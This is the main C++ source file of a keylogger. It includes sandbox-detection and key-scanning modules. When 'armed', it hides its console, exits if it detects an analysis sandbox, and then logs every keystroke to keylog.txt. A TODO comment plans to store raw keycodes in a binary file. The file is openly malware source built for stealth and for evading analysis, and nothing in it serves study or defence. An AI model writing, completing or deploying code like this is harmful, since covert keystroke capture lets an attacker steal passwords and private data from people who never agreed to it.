#include "pch.h"

#include "log/logFILE/file.h"
#include "sandboxdetect/sandboxdetect.h"
#include "keyscan/keyscan.h"

int main() {
	//if running in field hide console and check for sandbox environment
	if (ARMED) {
		FreeConsole();
		if (!sandboxdetect::checkSafety()) return 0;
	}
	//scanning from hereon
	auto* l = new logFILE("keylog.txt");
	keyscan scanner(l);
	scanner.scan();
	//will never be reached
	return 1;
}

//TODO: transfer character interpretation to standalone program, saving only keycode and pressed modifiers to binary file